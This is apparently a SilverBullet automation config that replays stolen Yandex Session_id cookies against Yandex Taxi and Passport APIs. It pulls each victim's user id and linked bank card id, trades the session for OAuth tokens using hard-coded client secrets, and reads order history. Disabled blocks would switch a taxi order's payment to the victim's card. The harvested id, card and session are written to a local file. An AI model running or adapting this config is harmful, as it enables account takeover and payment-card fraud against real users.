BLOCK:Parse
  input = @data.SOURCE
  prefix = "ss"
  MODE:LR
  => VAR @ss
ENDBLOCK

BLOCK:FileDelete
  path = "D:\\Program\\SilverBullet.v2\\y\\user.txt"
ENDBLOCK

BLOCK:Parse
  input = @data.SOURCE
  prefix = "yango/1.6.0.49 go-platform/0.1.19 Android/"
  MODE:LR
  => VAR @ua
ENDBLOCK

BLOCK:Parse
  input = @data.SOURCE
  prefix = "tc.mobile.yandex.net"
  MODE:LR
  => VAR @dom
ENDBLOCK

BLOCK:Parse
DISABLED
  input = @data.SOURCE
  prefix = "356e27497bb53e639685a255f7363e2a"
  MODE:LR
  => VAR @order
ENDBLOCK

BLOCK:HttpRequest
  url = $"https://tc.mobile.yandex.net/3.0/launch"
  method = POST
  httpLibrary = SystemNet
  customCipherSuites = ["TLS_CHACHA20_POLY1305_SHA256", "TLS_AES_256_GCM_SHA384", "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256", "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256", "TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256", "TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256", "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384", "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384", "TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA", "TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA", "TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA", "TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA", "TLS_RSA_WITH_AES_128_GCM_SHA256", "TLS_RSA_WITH_AES_256_GCM_SHA384", "TLS_RSA_WITH_AES_128_CBC_SHA", "TLS_RSA_WITH_AES_256_CBC_SHA", "TLS_RSA_WITH_3DES_EDE_CBC_SHA"]
  customHeaders = ${("Accept-Encoding", "gzip, deflate, br"), ("Accept-Language", "ru"), ("Content-Type", "application/json; charset=utf-8"), ("Content-Length", "620"), ("User-Agent", "<ua>"), ("Cookie", "Session_id=<ss>")}
  TYPE:STANDARD
  $"{}"
  "application/json"
ENDBLOCK

BLOCK:Parse
  input = @data.SOURCE
  leftDelim = "\"id\":\""
  rightDelim = "\""
  MODE:LR
  => VAR @id
ENDBLOCK

BLOCK:Parse
  input = @data.SOURCE
  leftDelim = "\"authorized\":"
  rightDelim = ","
  MODE:LR
  => VAR @auth
ENDBLOCK

BLOCK:HttpRequest
  url = "https://tc.mobile.yandex.net/3.0/paymentmethods"
  method = POST
  httpLibrary = SystemNet
  customHeaders = ${("Accept-Encoding", "gzip, deflate, br"), ("Accept-Language", "ru"), ("Content-Type", "application/json; charset=utf-8"), ("Content-Length", "620"), ("User-Agent", "<ua>"), ("Cookie", "Session_id=<ss>")}
  TYPE:STANDARD
  $"{\"id\":\"<id>\"}"
  "application/x-www-form-urlencoded"
ENDBLOCK

BLOCK:Parse
  input = @data.SOURCE
  prefix = "card"
  leftDelim = "\"id\":\"card"
  rightDelim = "\","
  MODE:LR
  => VAR @card
ENDBLOCK

BLOCK:HttpRequest
  url = "https://mobileproxy.passport.yandex.net/1/bundle/oauth/token_by_sessionid"
  method = POST
  httpLibrary = SystemNet
  customHeaders = ${("Host", "mobileproxy.passport.yandex.net"), ("Content-Type", "application/x-www-form-urlencoded; charset=utf-8"), ("Accept", "*/*"), ("Accept-Encoding", "gzip, deflate, br"), ("Connection", "keep-alive"), ("Content-Length", "125"), ("User-Agent", "com.yandex.mobile.auth.sdk/6.20.9.1147 (Apple iPhone15,3; iOS 17.0.2)"), ("Accept-Language", "ru-RU;q=1"), ("Ya-Client-Host", "yandex.ru"), ("Ya-Client-Cookie", "Session_id=<ss>")}
  TYPE:STANDARD
  $"client_id=c0ebe342af7d48fbbbfcf2d2eedb8f9e&client_secret=ad0a908f0aa341a182a37ecd75bc319e&grant_type=sessionid&host=yandex.ru"
  "application/x-www-form-urlencoded"
ENDBLOCK

BLOCK:Parse
  input = @data.SOURCE
  leftDelim = "{\"access_token\":\""
  rightDelim = "\""
  MODE:LR
  => VAR @token
ENDBLOCK

BLOCK:HttpRequest
  url = "https://mobileproxy.passport.yandex.net/1/token"
  method = POST
  httpLibrary = SystemNet
  customHeaders = {("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"), ("Pragma", "no-cache"), ("Accept", "*/*")}
  TYPE:STANDARD
  $"grant_type=x-token&access_token=<token>&client_id=f576990d844e48289d8bc0dd4f113bb9&client_secret=c6fa15d74ddf4d7ea427b2f712799e9b&payment_auth_retpath=https%3A%2F%2Fpassport.yandex.ru%2Fclosewebview"
  "application/x-www-form-urlencoded"
ENDBLOCK

BLOCK:Parse
  input = @data.SOURCE
  leftDelim = "{\"access_token\": \""
  rightDelim = "\""
  MODE:LR
  => VAR @token2
ENDBLOCK

BLOCK:HttpRequest
DISABLED
  url = $"https://tc.mobile.yandex.net/3.0/launch"
  method = POST
  httpLibrary = SystemNet
  customCipherSuites = ["TLS_CHACHA20_POLY1305_SHA256", "TLS_AES_256_GCM_SHA384", "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256", "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256", "TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256", "TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256", "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384", "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384", "TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA", "TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA", "TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA", "TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA", "TLS_RSA_WITH_AES_128_GCM_SHA256", "TLS_RSA_WITH_AES_256_GCM_SHA384", "TLS_RSA_WITH_AES_128_CBC_SHA", "TLS_RSA_WITH_AES_256_CBC_SHA", "TLS_RSA_WITH_3DES_EDE_CBC_SHA"]
  customHeaders = ${("Accept-Encoding", "gzip, deflate, br"), ("Accept-Language", "ru"), ("Content-Type", "application/json; charset=utf-8"), ("Content-Length", "620"), ("User-Agent", "<ua>"), ("Authorization", "Bearer <token>")}
  TYPE:STANDARD
  $"{}"
  "application/json"
ENDBLOCK

BLOCK:HttpRequest
  url = "https://ya-authproxy.taxi.yandex.ru/4.0/orderhistory/v2/list"
  method = POST
  httpLibrary = SystemNet
  customHeaders = ${("Authorization", "Bearer <token2>"), ("Accept-Language", "ru"), ("X-YaTaxi-UserId", "<id>")}
  TYPE:STANDARD
  $"{\"services\":{\"taxi\":{\"image_tags\":{\"size_hint\":9999},\"flavors\":[\"default\"]}},\"range\":{\"results\":20},\"include_service_metadata\":true}"
  "application/json"
ENDBLOCK

BLOCK:Parse
  input = @data.SOURCE
  MODE:LR
  => VAR @parseOutput
ENDBLOCK

BLOCK:HttpRequest
DISABLED
  url = $"https://tc.mobile.yandex.net/3.0/couponlist"
  method = POST
  httpLibrary = SystemNet
  customHeaders = ${("Pragma", "no-cache"), ("Accept", "*/*"), ("Accept-Language", "en-US,en;q=0.8"), ("X-YaTaxi-UserId", "<id>"), ("Cookie", "Session_id=<ss>")}
  TYPE:STANDARD
  $"{\"zone_name\":\"moscow\",\"services\":[\"taxi\",\"eats\",\"grocery\",\"random-discounts\",\"scooters\"],\"payment\":{\"type\":\"cash\"},\"id\":\"<id>\",\"supported_features\":[\"promocode_copy_action\"]}"
  "application/json"
ENDBLOCK

BLOCK:HttpRequest
DISABLED
  url = "https://tc.mobile.yandex.net/3.0/changepayment"
  method = POST
  httpLibrary = SystemNet
  customHeaders = ${("Accept-Encoding", "gzip, deflate, br"), ("Accept-Language", "ru"), ("Content-Type", "application/json; charset=utf-8"), ("Content-Length", "620"), ("User-Agent", "<ua>"), ("Cookie", "Session_id=<ss>")}
  TYPE:STANDARD
  $"{\"orderid\":\"<order>\",\"payment_method_type\":\"card\",\"tips\":{\"decimal_value\":\"0\",\"type\":\"percent\"},\"payment_method_id\":\"<card>\",\"id\":\"<id>\"}"
  "application/json"
ENDBLOCK

BLOCK:FileAppendLines
  path = "y/user.txt"
  lines = $["<id> | <card> | <ss> "]
ENDBLOCK
